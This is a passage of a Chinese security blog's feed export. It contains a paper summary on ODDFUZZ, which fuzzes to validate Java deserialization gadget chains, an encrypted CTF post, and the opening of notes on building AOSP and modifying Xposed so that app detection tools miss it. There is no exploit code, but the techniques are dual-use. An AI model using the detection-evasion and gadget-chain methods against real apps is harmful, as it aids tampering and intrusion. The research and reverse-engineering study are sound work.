graph（CG），来寻找可达的路径。然而，由于java运行时多态，虚函数调用无法被确定。因此，我们使用<code>轻量的基于摘要的污点分析，来标记可疑的gadget链</code>。</p><p>&emsp;<code>函数摘要的计算</code>。oddfuzz首先计算所有函数的静态摘要，具体来说，oddfuzz提取<code>函数参数与this作为其摘要</code>。之后，追踪方法中变量的传播，主要针对四种类型，<code>Assigin/Load/Store/Call</code>。<code>数据依赖于方法参数的变量也包含在方法摘要中</code>。这些摘要用于识别可利用的gadgets（gadget链上的点）。</p><p>&emsp;<code>gadget链的识别</code>。oddfuzz指定可利用的方法与敏感调用站点（sink）的列表，并基于上一步的函数摘要来识别可疑的链，在本文中指定了16种可利用的方法与30个sink（附录A）。（1）之后，由于gadgetInspector使用BFS（广度优先搜索），在不可行路径上遍历过的gadget就不会再考虑，从而导致漏报。而本文中，一旦在程序路径中找到前面标记过的可利用方法，那么就会从source gadget开始，基于方法摘要调用DFS，来找可利用的gadget链。（2）为了避免无休止循环，制定门限以规定链的最大深度。（3）为了处理java的运行时多态，使用层次结构分析CHA，仅当调用点被污染时，才会使用CHA，避免由于盲目考虑所有的gadget带来的路径爆炸问题。（4）oddfuzz的工作方式像普通的CG污点分析器。（5）所有来自于source的路径分析完成之后，就开始运行validator。借助轻量污点分析，可以平衡有效性（识别尽可能多的gadget链）与扩展性（可接受的时间开销）。</p><h3 id="C-结构感知的定向灰盒模糊测试"><a href="#C-结构感知的定向灰盒模糊测试" class="headerlink" title="C. 结构感知的定向灰盒模糊测试"></a>C. 结构感知的定向灰盒模糊测试</h3><p>&emsp;给一个java程序与候选gadget链，<code>oddfuzz使用结构感知的定向灰盒测试生成用于validation的可注入对象</code>。fuzzing loop算法在附录B的算法1中。</p><p>&emsp;<code>结构化种子生成</code>。生成语法上有效的注入对象需要：（1）设计反映gadget执行流的嵌套对象结构。（2）分配合适的属性值，方便到达sink。为此，设计了<code>结构感知的种子生成方法</code>，通过使用<code>属性树</code>的分层数据结构处理复杂的嵌套，其中<code>根节点代表一个保存多个gadget的类对象</code>。如下图所示，首先实例化gadget链涉及的类，并利用反射来收集类的可用属性，并构造属性树。</p><p><img src="/images/oddfuzz/image-20231114215527381.png" alt="image-20231114215527381" style="zoom:67%;" /></p><p>&emsp;具体来说，如果<code>属性树中节点的类型是对象，且此对象由另一个属性树表示，且此对象对应的类保存目标链的下一个gadget</code>，则我们通过连接此节点来合并两个属性树。并且，当属性树中某个字段节点的类型是另一个属性树的根节点（类对象）实现的接口时，两个属性树也会合并，如上图的 Comparator comparator 和 TransformingComparator 连接一样。</p><p>&emsp;当oddfuzz识别出可疑的 gadget 链（需要validate）时，它将被送入输入生成器以构造相应的属性树。<code>目标gadget链的多级类层次结构可以使用属性树很好地建模</code>。然后，fuzzer开始遍历属性树的主干，将其转换为用于fuzz的初始注入对象（上图右侧）。其他没有后继的属性节点（例如上图的Object[]）将被设置为null，以进行突变。</p><p>&emsp;<code>使用混合反馈来对种子的优先级进行排序</code>。对注入对象进行随机生成和变异不一定会到达sink，这种没有明确反馈指导的不确定性fuzz会使fuzzer退化为语义盲目的愚蠢模糊器。为了有效地选择和调度种子以到达sink，使用<code>混合反馈驱动的种子优先级排序方式</code>。即，为更接近sink的种子分配更多能量。oddfuzz考虑了两种类型的反馈指标：种子距离和gadget coverage。</p><p>（1）种子距离。计算种子距离以优先排序并安排种子以尽快到达sink是目标灰盒测试 DGF 的核心。种子s与sink所属的目标基本块$T_b$之间的距离计算为：</p><script type="math/tex; mode=display">d(s,T_b)=\frac{\sum_{m\in\xi(s)}d_b(m,T_b)}{|\xi(s)|}</script><p>&emsp;其中$d<em>{\boldsymbol{b}}(m,T</em>{\boldsymbol{b}})$是种子s执行轨迹中的基本块m与目标基本块$T_b$之间的距离。<code>我们不是枚举种子 s 执行路径上的所有基本块</code>，而是收集目标链的 gadget 内执行的基本块$\xi(s)$来计算种子距离，避免fuzzer探索不相关但更接近的路径。</p><p>（2）gadget coverage。使用此指标来优先考虑覆盖更多程序路径的种子。在最初的模糊测试阶段，gadget coverage旨在引导fuzzer选择不同的种子并对其进行优先级排序，避免因偏爱具有特定执行路径的某些种子而陷入局部最优。在power 分配阶段，<code>gadget coverage尝试为种子提供相同的距离，但覆盖更多的分支，从而提高突变的机会</code>。</p><p>&emsp;oddfuzz将所有生成的种子根据距离升序排序，并维护一个两级队列。第一个种子（或距离相同但覆盖范围不同的种子）将被放入优先队列中，其余种子将被放入较不优先队列中。因此，oddfuzz 有更大的机会从优先队列中选择下一个种子进行变异。至于power分配，oddfuzz使用如下方程，以便为所选种子输入分配适当的能量：</p><script type="math/tex; mode=display">p(s,T_b)=\psi(s)\cdot(1-\widetilde{d}(s,T_b))</script><p>&emsp;其中$\psi(s)$表示gadget coverage，并且$\widetilde{d}(s,T_b)=\frac{d(s,T_b)-minD}{maxD-minD}$是归一化种子距离。通过此方程，<code>fuzzer可以确定应用于当前种子的变异机会数量</code>，并评估在种子优先级排序过程中是否应优先考虑变异种子，从而在探索不同的执行路径和对种子进行优先级排序之间取得平衡。</p><p>&emsp;<code>前向种子突变</code>。以前的fuzz是通过位翻转等操作随机改变二进制文件来产生新的输入。然而，<code>当应用于结构化输入时，这种位突变可能会导致无效语法</code>。为了解决这个问题，我们利用 JQF（参数化模糊测试框架），它将结构化输入映射到一系列参数，以在位级别改变生成的种子。<code>参数上的这些位突变对应于结构化注入对象上的属性级突变</code>。然后，oddfuzz 应用前向种子突变策略来有效引导种子前往sink。</p><p>&emsp;具体来说，fuzzer首先遍历要变异的注入对象的属性树并检查每个属性的类型。对于<code>原始数据类型（例如 boolean、int），fuzzer使用 JQF 中的多种伪随机方法将无类型位参数转换为随机类型值；对于reference数据类型，fuzzer为特定类型定制目标模板；当类型为class时，fuzzer 将通过random.choose()方法从该属性的子类中随机选择一个类。对于数组属性，模糊器使用 random.nextInt() 方法随机设置数组大小，并根据元素类型（即继承数组类类型的实例）为数组分配随机值。</code>例如，从Fig.7.中的属性树生成的注入对象的参数序列为：</p><p><img src="/images/oddfuzz/image-20231115194857259.png" alt="image-20231115194857259" style="zoom:67%;" /></p><p>&emsp;上图的解释如下：为了改变属性 size 的值（类 PriorityQueue 中的 int 类型变量），fuzzer调用 random.nextInt() 方法来生成随机整数 1。为了生成对象数组队列，fuzzer调用方法random.choose() 从预定义的字典中为其分配一个实例对象，该对象由候选 gadget 链中所有类或方法涉及的一些特定属性值（例如类对象、字符串对象）组成。</p><p>&emsp;此外，为了引导种子走向sink，oddfuzz在位级别上改变感兴趣的注入对象的嵌套子对象。为此，我们使用 random.nextBool() 方法<code>将额外的标识符字节插入到注入对象的参数序列中</code>。当fuzzer在遍历属性树时遇到类对象节点时，fuzzer会添加一个字节作为标识符，以标记是否更改此嵌套子对象的属性值。我们利用fuzzer收集的gadget coverage来识别注入对象覆盖的最后一个分支所在的类，一旦注入对象被卡在某些gadget中（不按照链向下运行），fuzzer就会将相应的标识符字节设置为 true，并将随机值分配给参数，这些参数对应于被卡gadget所属类的属性的结构突变，以产生新的输入。</p><p>&emsp;为了说明前向突变，考虑以下参数序列$\sigma_{2}$：</p><p><img src="/images/oddfuzz/image-20231115195815150.png" alt="image-20231115195815150" style="zoom:67%;" /></p><p>&emsp;如上所示，假设有一个注入对象卡在gadget TransformingComparator.compare() 中，fuzzer将其 Identifier 翻转为 true 并改变 TransformingComparator 类对应的参数序列（例如，将实例T分配给属性transformer）。基于这种前向突变策略，fuzzer可以有效地生成更有可能到达sink的输入。</p><p>&emsp;最后，当变异的种子到达sink时，fuzzer将报告给定的gadget链是可以被利用的。</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>&emsp;我们基于流行的 Java 模糊测试平台 JQF 实现了 oddfuzz。我们定制了它的组件，使其适合gadget链模糊测试，同时搭载 JQF 的底层功能，例如运行时检测（<code>tai-e能做到这一点吗？</code>）。</p><p>&emsp;<code>污点分析</code>。 oddfuzz 使用 Soot 来解析 Java 字节码并将其转换为中间语言 Jimple 。基于 Jimple 的基本类信息（例如类修饰符、字段、方法），实现了基于方法摘要的污点分析。</p><p>&emsp;<code>结构化模糊测试</code>。 <code>oddfuzz 修改了 JQF 中内置的 junit-quickcheck 生成器，以根据候选 gadget 链随机生成和变异结构化注入对象，而不是手动编写输入格式的声明性规范（例如上下文无关语法或协议缓冲区）</code>。为了<code>启用和促进结构化感知种子生成，采用 JRE 提供的类 sun.msic.Unsafe</code>，允许用户创建类的实例，而无需调用其构造函数代码、初始化代码、各种 JVM 安全检查和所有其他低层次的东西。</p><p>&emsp;<code>运行时Instrumentation</code>。当 JVM 加载类时，我们使用 ASM 工具包通过 javaagent 动态检测 Java 字节码。当测试程序 PUT 启动时，oddfuzz 工具会注入一个静态方法调用，该调用在每次调用或跳转指令后执行，<code>以跟踪注入对象的执行</code>。出于效率考虑，检测仅限于与gadget链相关的字节码，而不是整个程序。</p><p>&emsp;<code>反馈收集</code>。对于覆盖率信息，我们对 JQF 进行了最小的修改，通过跳转指令检测每个基本块，来收集branch覆盖率。对于距离信息，oddfuzz 基于 ASM 在字节码级别生成相应的 gadget 链的过程内控制流图（CFG）。 CFG的根节点（即gadget）由方法签名来标识，而其他CFG节点则由相应基本块的跳转指令来标识。当将 gadget 链送到fuzzer进行验证时，oddfuzz 距离计算器会根据 gadget 链的调用顺序和生成的 CFG 计算每个基本块到sink的过程间距离。距离计算器是用 JGraphT 库实现的。</p><p>To be continued…</p><h2 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h2><h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h2><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ODDFUZZ-Discovering-Java-Deserialization-Vulnerabilities-via-Structure-Aware-Directed-Greybox-Fuzzing&quot;&gt;&lt;a href=&quot;#ODDFUZZ-Discovering-Java-Deserialization-Vulnerabilities-via-Structure-Aware-Directed-Greybox-Fuzzing&quot; class=&quot;headerlink&quot; title=&quot;ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing&quot;&gt;&lt;/a&gt;ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing&lt;/h1&gt;&lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;&amp;emsp;可以用静态分析来定位java反序列化漏洞。ODDFUZZ使用轻量级污点分析定位候选的gadget链（避免漏报），之后使用定向灰盒测试生成poc用例来减少误报。ODDFUZZ使用结构感知种子生成方法保证用例有效性，并使用混合反馈与步进策略来指导定向模糊测试。&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
  <entry>
    <title>blog-migrate-test</title>
    <link href="https://wd-2711.tech/2023/11/03/blog-migrate-test/"/>
    <id>https://wd-2711.tech/2023/11/03/blog-migrate-test/</id>
    <published>2023-11-03T11:46:36.000Z</published>
    <updated>2023-11-06T12:45:46.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id="博客迁移日志"><a href="#博客迁移日志" class="headerlink" title="博客迁移日志"></a>博客迁移日志</h1><p>test</p><span id="more"></span><p><img src="/images/blog-migrate-test/image-20231106203331118.png" alt="image-20231106203331118" style="zoom:67%;" /></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;博客迁移日志&quot;&gt;&lt;a href=&quot;#博客迁移日志&quot; class=&quot;headerlink&quot; title=&quot;博客迁移日志&quot;&gt;&lt;/a&gt;博客迁移日志&lt;/h1&gt;&lt;p&gt;test&lt;/p&gt;</summary>
    
    
    
    <category term="杂记" scheme="https://wd-2711.tech/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>ACTF-2023</title>
    <link href="https://wd-2711.tech/2023/10/29/ACTF-2023/"/>
    <id>https://wd-2711.tech/2023/10/29/ACTF-2023/</id>
    <published>2023-10-29T07:27:19.000Z</published>
    <updated>2023-11-03T11:45:43.106Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d9b3a03e3e153d036277dc89aa77374bc1b84efeb0c015576d6d883ec5019b81">2c151d14a1692af99fa0c574696ab642630118ededbcd92b05c804024ee0b0d5c33d136ca7235af03d566c7c3a95470f96acb84bd1a4fcecee982ed4116f2d6d2629479380fae66c7926a983c377862100352fbe125880e6cb124905b9ae6d357ec2188ff0b91db24de00cd0e4a72d9558bfa6c836774447ed250cdf28d4019fcb1fd8f2c2ab2b42ea49d2fdbceab2567b70ff1695fe2103cf9781c28b9d8918ddad32968c689f77b940ceb8a9f9cbe185487269f55f803b1675f0bf4c173aac0b3c3899f4f19b9cbdf58faff257b8810c9c207ded93b360cfa909c772bbe67747f4b20bbefc155338a1b3e0d2788fca5b918fb85ee435b1cc816f95344288cfdf4f4c92da259ee72a9ccc26af0d8a7ec0c03450a4c54268f796a97e9eb87dca1249f478e28af191785ca663d508f23ca01a539796f081d8d9e8dbb450c602e9d73de54aa8845885e5ad73124fb8395ebc67ae27650d19ace2d26d733d4532caffef461f642ca627ffed5d2bff42a2f221c21137d703537b451946b43bd0653fbba819c07cba445d94c0bed9d86b62853fbbc1d906b3b51446b1bc4f9232e117a61a86b86ddead0318af0ff415ef13e38b7ef6087928d66ae29f829c355f29d181f582a472eef1a6fc232b3e7e15469ccca50257393bc6f38fe4f224ccf3aef3d47c5f07b70e086df7a1847a2bb2bcdd6437059b78ddc655ebde390eaba30b837d2b9ba49861e642474e5cffe5c29a081b8bd3b1ba3296af6879a768e7732325924ff4bdaa26855cc040470f4e410c4d5f425d2a0619981361fd3835228c45905d5872d59c0d5097dd76179211ff063f4f15fb822df55946b5fb7ccedef3576cd511638e0fa9f1213b0d3a4cb0d06629402017ba8632e694269054a21e1cd255e625022a76441358fd527f5fdeba3bdfcf5df324e3d3ec49a727e2d960f56d69deecd05547e5873ace08ee71acd27a22d961038942c7e2e9bc440f81d8c444b0a452b2b34bd87181fa119376cc680cfb0f0c5cda7d8f6e9099568aea29d2a1f469e8ff78705a7d3aa21eaadbe03376fc8ac2e881adc4601ce80ca8ecaa3cd2e2a0a0252b804fb7f525576617c6d958cd2d56a5e83c5537a2d2f9bee44219dd46af37b9864ffaf03ed3409f1b6ee54da0d93640a4bf2f88aa85ad4684f93e9dcadc9e1ca474e555172b513253d9f58ae618d00b5c0629cf4ac2c987fafed4703f012d7b3ef179d8c2f4ea92eb37d8819afba6005b10fc34994bf2d56268cc302983555eb1c33cc44623b83b77dfacda39131202f5c262ffac1c0f3e9d2bc3cabd3dfb63f00e6b9f4aec4e07e940f4e7ad5f7f351cf7669d107a1288cebfe89ec1e7a5d766dc0e1b85c15bb3caaca28f68eac503fda7726de296ae96234b7e81c633f28897664e96c94818f4881fa369b22835883f27c11a28ba550bae40d61781e1d6403f9eebd080f6e25ae7e21312bc179146d4a6f6fd74435607dd1caa5c2a65a99330dfd4089764874935b74701299e3bb20a37375a9c07a9a0ccd27fe65b512f354fdd2b79e113131d0754144752fffe601de582cb47f5319c819a1fd4602d4c0cb93b3f59cbf8f0928c4c5706698cfe0e2d702a5eaa66979ecf2c7a9a42e681fe41e05b3280910b73cf4bfaf729a061ad161a710798289a313077c2af42eb22b9c11b39b6ac651111a67749dc85b2437e9069fb28ab7a295cfa958a6bc0d72816c89a0079a8f37a9cd2d1d4c340f430d0c4aef12b149e36845f9f4c76a944d61a910f29ea92daa1d6e67f975ce56c95f4dc8b9eef3316f30ddb6b79bb94e619b1001a63130bb682d5e480bc2cd992b91fc56692f878c9179452a86a84332a41410097eaa2320c7bcab3ce72b62732f1e3b2dc647dd65d49656187076465ac79f35859f4b6ce1b13aba5e4e9278945ea8f26a61ec90a35e1d3d6fe04f0f76938beb9c33d2a7c0763e4a6cdb5d80d11ef6b23189b9d4dc3f894401fb6aad799a0ae701700b051c15bae32e53b368cf91b8e2e5e1d9be6c9722157ced2495b22f08c83f614b557905643730313df3a6e4cc01bb1f5ee38015f254e9e300f6c935f4c6e001908799a4525dc710b27890d3511abc6a6570ab84b26b68886db6530551b7be6b234743132aeea576194d7997a19a8de8a69620632b8e1383c5c269e170eed33d933e5a43c7f0c7623c9949a87a197779d5b3240941d11385def80c236fe03d7ea16bacda0c9b52547cf5ad13ecd5db37ad97942bd5982f03928b0285a0a31021e2e991cabfb68cfefcca47c493f13ef8e8d7af4aac8899609009cebd5ceb7bc7d0973729fcb0cc9447a7cee6a1b9e63c98f42ed605cd3dccfda9deba70a270c1b348131b6fe5876dbbce4c7f95e663dce0303c362e91d06fb82e9182cd1ff47209e2323f0c5094c889ca3028afbdea4493c488eb054704df2e34d89e8be32e4d7c3f57b98db9858acc0de3593a9d16673dc19d7b40e166c7f7cac0a7f9aa17574bd71719fc902bcca4717deace1f595c9bfb0dc24be78c573ffe236bf80ce9e78853bab84b4c116ad3ee99913204b3c7f81cfa413fdb643cf5f46710844349835b77a046cb53754309a745d332b3acc781428ad3d2a928e7b84e88d0cebaac5355211b72bc15ab820f6e7ec3594b35871064155b1fd1801252e2c2f55979bd1ec3417502fe5c676fa6ddf3527858244806a0e21b02e90eb244aa6e9f110022a0fd9c35cae38fdf92d6476c83930c96fedec036e3512a578107381e73f99cbc153b9d46f30d3e08b42d1c9ac55976b5de0ec494afffcdf39d5d981e8c0490adc2a77cf280a562bb78ab1c1f850d6f529a46522c5f485c47af5aa6aac62b90b8803a70526b618927cb2b5a6f09ad51370dfc380b81f0e8f5921a52223e1dcf94daacf6367f60e02217121bb1953344d0f898b8057fef51073cd9f7b8e58c01014b07dd2ef7875d24bbec734d1750a1e772e43777930831e05b5d36ad03c29a9e5b5ddf76bc7479862027a49ef8587314f1a13c25f92fe46411c7f1233bb1d8c6daf8584c44709ae3c4a3a7249e02d7b33e22ab9c23c8e8b4f024ca335bb1c6dd087c341bc326f794a10db7c36cfd4a935dccf31a74742a4ea1886b746731843e281f7a6447576f0f575f942c78516fc69e94e61798ab50bdfda521c5ded90987682829fbbe5be500bd9d487d508aef4e5e536bdfc3ea7d9226e9afcbfa19ea5a3dc033946b540264b71853abd97ce3d935ae1df61a40d5ed80e17dec00b8b006a8dfba222c0e871592d45362734fa05f496d76df83821ab10e6413315f8087fe32795c15b59131735f0a6645409a430e59e6cdfe0bd2e945af4f64b87ed58a7fdba61440dbdfbbd39f11e2e54a9ecf95813b24b4a80aab9e27a1e0a6f5a88e47359f2620a7275927d76cfd78b0a0ca8de62ac201e971f69374ad612c61d185fdb39b05d33cf951f3ce9099cec77d1e7dcea86d04b548b6faf79c90e247f280a5cb09dc046c052b06c466ac797f1416b6e857fe43c8130288e46b2fa4356d50bb7de1ba01dcb4be8a1a95acc4775cf983f3e8b76e43f7562292ebe3c72628343c395d8920aefbeb79380d0ecb5e92606e679062beb5ad2a10b646fc9889cb67017699f145cdc24edf8742a72be30179e75983a6cb50892bde229a71e2dcdda3fb7a44c3e118157da125d812fc953bfbe732903121299c813809a7cb61e6b453266288f200929e0bf9ca8a36dc7b21c4f3a6ebbd175cc1cb05b5824727b21765533ab58a43c548607ff5db8ce76018c35365ab77c6937c14ce8e1f6b765505de0eda0eb46d5f722f231b54a96054c48f936cb00bc7b3f118da2069aded1f92de75758ff210b3fb7361bdfd4cdb83f50e35a78143cbb642b848aa6b929309c51573f15e0516de37177c1bac31089b6b650b71adcafa219253f1f43915af84a3ae4e1a89e589d6720ec5fe4fa4f9fc865fc7bc57038319b8203dd7b9ab6b9032f496301df4b9274c918147b5a05ea9f8f6d804c530a7b4b526963064bca20259406b399e60377f4b6679ed38c19d60ede8ca90ca4d8750524944857f9fe7c0365b0e6e79c972a87a5ab0ba61e49a9728950d018b6ef6e9dac2da8623d3037ac6465ece421420d790689bac1622533ca7518227e28f53bced8e4c967a8fc1f2292ed6f0db569d6d9197a18b67a3e2d25d274bce3aeb54f47fd89bd1327e74d2427d35b7fda2edc5972a74541b26eeab234944f06dbc0fbe602cbc4b67ca7bb5dbc1b7dda156c5a3b76fa454250fcccb11256a35b5b2d57fa4bf8a36e3f176abaa290821e81702cc949b381cf323df4cf5443e0aa1ee6cf2626d87b19bad07447282710ba6965c2af3576d342a4322605123925c652e879863af7baa96d6199e23b29a3f78a3e55316b98a25cb040bb13f8257883a1d95d39a1843a8ad4af0ab79cb217af2281b3fc077e534cacc353ebf06c698911670d770b5c5d19906c655ee2f5fc7e35bc1728ee449ccea37c9b2803b42d1e507e750e1a60cd55b0c4313361041c66bde45765b56f11542156ae663f5b3632940cefc670ef54b91086c5f3c5b3f6a435d4c2a69bf957b051b7a18349fd1c5761bc0752a660ab81c5eb43cf0f06a305ba163b6a890038352eceb413a0f70523a1c7b459747aea0a150c6c776d0a0393b548a74a6c6f41984ee4ea696dd1bc9a4822cab995e10479fbb48f2edbba71a053089ba76b11514c928368b7d611affd3f72705c8633ece3f57fb0b944d1d404619bcf915c276431a8321d75090b77c7a0118df0ee2ef967136db4641bef88535f9f49a3d818ec7819e730fed49837b3d9cf58e342388330a86ee906bb6b2ce04b9cb40c73eaadcfa6094df63a9ec3a46736717addda1660922c707aee61a84e5491e27f9e4c17f2998ccd0c3c53be3e3c5bf4596486116650e65b3a5e7160da4cca94188afafd1ecab929113b5caebedd4fe0401dfd3fa382800da147b0c56e5d2a8d58c22dba4ee84a3fa2932afdeb7882b3f4fbd45394a7fc827f2e66754792a467ba75b4ea27270e58d3fd74159a08bfa72ef583d13d6b643dcf9feaecec1e11005030cc4fe477ff3290348e57542ad52f62d0587fbc1a7f550688c84a712c347d9c5dc7d9d70634f5785826384c5dd675b77157948da304b5932ceff68301ab29d843d789e5079c8ed0e0bd8a74b288808082adb5640e373dabc2704e0054f735bfebf573e2f19feb75739754d5cd6cad846b0100c782e3639a34bac1323aad653015f4d1b1c26935dbe13e60cc9962e14d705a224834c93e3ed2876e5881c21900e82a977d5e0e48f90db390330cee8881f5a7761a5e265c1de6f44a89ba08a9cb566ab7a848369d9b958a26fd74a07cddef882f37d6eb1d778cb2e8fb01888c8dda8c2e1a22bd0498ae7f1a0272f6a4738794d6428b7b9968c9ccf4f457b3447e2842fb91710307e1270244befbbd10fad068e7dc41581d5c2be4e45b33e81242ab91dd6fdbc550e4a94718deaba3af1f831092df7a959b4e6c9f3f5748d9e2e21bc07be1621dfcf2176c277745990bad190a7ac27468b527787e01596c854f7f73d1c307b8af398e96bd554b44ca3505f17a71313779280dd2a2020b6073dc8e7ed1d9c582e8aabb85e002db69912c63cf3ec2fe7a02802bcf0f9c5b222b57d41df08cfe5de4d0b94ae5f00cd5833c9738c4622986d26b03248af51527b322bdf933e4aa54dde64b8a8ff0f11346ad53edd86494905f5f6f78fa3afebdbf2d3b0aa182d082d9069fa31de886f7ee7fa4f11183912065bbcc746d04751730c2e01e05caf80d34974cf0de9b01abed577f9349dd4f22b8d8d68b75982a3664cfc31d34240c95884a4bf8407a80b6aea9ec5c08a87d7d421110d61808b67d46e6c9863535d2ae53c2affcc6158109e3f0a6268010858925c6a757b4812c47bfd7aa775a71b4b47f1fd4f196825960e2a8ef1a4d5db582760f96295b45b9734909c1b36b6d501892b54cf23cac4a1cf9880ac48098509d5045ffbfa2e9bbebb2fc3c96207c93839bdd0f82f6cefe7408938ad58ff708b76d246c4b8903bd0ea0926c49502532395ba6a6241d06d39dca7b5846d4367f0e6fccbe82a9add756b29023ab84bdee5465fbcb903643d54382a0867171c95c66b2d3532db9d39b9055aaea822657ce3b4b4d1dae5fffe17f71ac54417127bb5343a0d0ab56229dac8d0151b539df47f2a473007e3f1d2968a20916543888245a9b91dece2f58d409a0a07269ad198c8520cb26081681b8653c77eb5e8d73d67ff63f524a7fb35a0d1ba1c2a812c547e83c14b0174b2f00c9987807ac487bf49a162d672c5d3139e7d874a20867d5ff0dbcb286aa13d7301775adaa0a2ec9daf1832767173abce229bd2ab42628fad002561c2979ba46279558a73bdbf939bdf5f41b43d4470d96c0f21df8c7da4ac31014f60df3def9ee048641522014fc38f080155625db38e447c582ba76b0b9b08a023f11d1e58a5978eeef25c7aa01b70c0e859a685cdd2d17b1fa3fa3e6f1f5d440de1e60970157100f4d392489dcbd60bce35bc19d0ba5b010506d1d2124364d24f423086c201154ef8ed6e4474bdd5e379543f89b5ebbb5a9f8fd647fa5a9ab3755de273c1c64ba5b46638772cf61d714370acb4f10e53b249a1273e65c320164ebf859a67fbc65bb1fb7e547edfd17a03eaafd05ab7f2c02c5a58e0f043ce6288d1c59072f678fe1f7ad8a1908a322eba5cee0208bcd256dcb655458b892330fe2d53bc4aca74036d29263b81c654699995d520d04ad854549b70b1092988200793f2de4814cdc125ae78d880a4af76813eb2191c843277d1a9796db4f76d031cbbe776c3cf3c8ff5379b3f49a359fef31858494d06856c4e140c9590d70eab49dd9152f96025b9acda3ccd868bd25ed256551bb131bd658f703cc4bd7fa47d4cf17374432b2add54115087723d504005f5eb2f2f33a62fbf3097ed490e5eb40bc8a4a8faae954d1b580ca95ac615e461911e9fb6abe28a82b8b5435e436791ee81527c42a992d77822001fe792bd823c91c467e7f8c3efadf1ee06ad7ca466893d80074cc719270de4c655b037412bf2c0df2ef687514d286f8577dca90219f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="re" scheme="https://wd-2711.tech/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>frida-reverse-analysis-3</title>
    <link href="https://wd-2711.tech/2023/10/22/frida-reverse-analysis-3/"/>
    <id>https://wd-2711.tech/2023/10/22/frida-reverse-analysis-3/</id>
    <published>2023-10-22T08:58:01.000Z</published>
    <updated>2024-01-24T14:12:40.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida逆向与协议分析-3"><a href="#Frida逆向与协议分析-3" class="headerlink" title="Frida逆向与协议分析-3"></a>Frida逆向与协议分析-3</h1><p>&emsp;frida逆向与协议分析第三部分，主要就是Android源码编译、沙箱等。</p><span id="more"></span><h2 id="0x05-Android源码编译与Xposed魔改"><a href="#0x05-Android源码编译与Xposed魔改" class="headerlink" title="0x05 Android源码编译与Xposed魔改"></a>0x05 Android源码编译与Xposed魔改</h2><p>&emsp;市面上绝大多数app都会对xposed框架进行特征检测，绕过的思路就是找到检测点（java层或者native层），然后hook修改返回结果，或者以硬编码、置零等方式来绕过检测逻辑。但是检测点很难找到（代码太多，或者以ollvm、vmp加固）。</p><p>&emsp;一个绝杀点就是：在源头消灭xposed特征，让你检测不到。本章就介绍如何魔改编译魔改xposed，从而绕过开源xposed检测工具Xposed Checker。</p><h3 id="Android源码环境搭建"><a href="#Android源码环境搭建" class="headerlink" title="Android源码环境搭建"></a>Android源码环境搭建</h3><p>&emsp;为什么要编译Android源码？Xposed源码不就得了。这是因为Xposed的编译过程很依赖android的源码，因此，我们先对android源码进行编译。（需要12G运存+450G硬盘，电脑办不了，只能组装了）</p><hr><p>&emsp;由于安卓源码引用了外部开源工具，例如OpenSSL，每一个子项目都是Git仓库，为了方便的管理这个Git仓库，安卓官方推出了相关的管理工具，名为repo。Repo封装了一系列的Git指令，可以方便的对多个Git仓库进行管理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir aosp712_r8 &amp;&amp; cd aosp712_r8</span><br><span class="line">repo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-7.1.2_r8</span><br><span class="line">repo sync</span><br></pre></td></tr></table></figure><p>&emsp;<code>repo sync</code>只是下载了系统运行必须的代码，只能编译出运行Android Emulator（模拟器）的虚拟机系统，要是想让此系统安装到设备中，还需要下载设备对应的驱动（作用是在物理机系统上起到协调上层系统与底层硬件的通信）。</p><p>&emsp;编译完成后，编译出来的镜像是不全的，还需要下载BootLoader等关键的系统镜像，之后即可刷上自编译系统。</p><h3 id="Xposed定制"><a href="#Xposed定制" class="headerlink" title="Xposed定制"></a>Xposed定制</h3><div class="table-container"><table><thead><tr><th>模块</th><th>功能</th></tr></thead><tbody><tr><td>XposedInstaller</td><td>用于下载和安装Xposed.zip刷机包。</td></tr><tr><td>XposedBridge</td><td>java层的API提供者，调用Xposed相关的API时，首先调用XposedBridge中的函数，之后转发到Native方法。</td></tr><tr><td>Xposed</td><td>位于Native层的Xposed实际实现，是对Zygote的二次开发。</td></tr><tr><td>android_art</td><td>对art的二次开发，以提供对Xposed的支持。</td></tr><tr><td>XposedTools</td><td>负责编译和打包刷机的ZIP包。</td></tr></tbody></table></div><p>&emsp;就是，将XposedInstaller安装到设备之后，XposedInstaller会下载由XposedTools打包的含有XposedBridge，Xposed，android_art的ZIP包，并将此ZIP包刷入到系统（放置与替换系统文件）。</p><p>&emsp;Xposed包的编译过程见书P137。</p><p>&emsp;之后，使用XposedChecker检测Xposed模块。其中有很多不同的检测项，例如：</p><p>（1）<code>载入Xposed工具类</code>检测项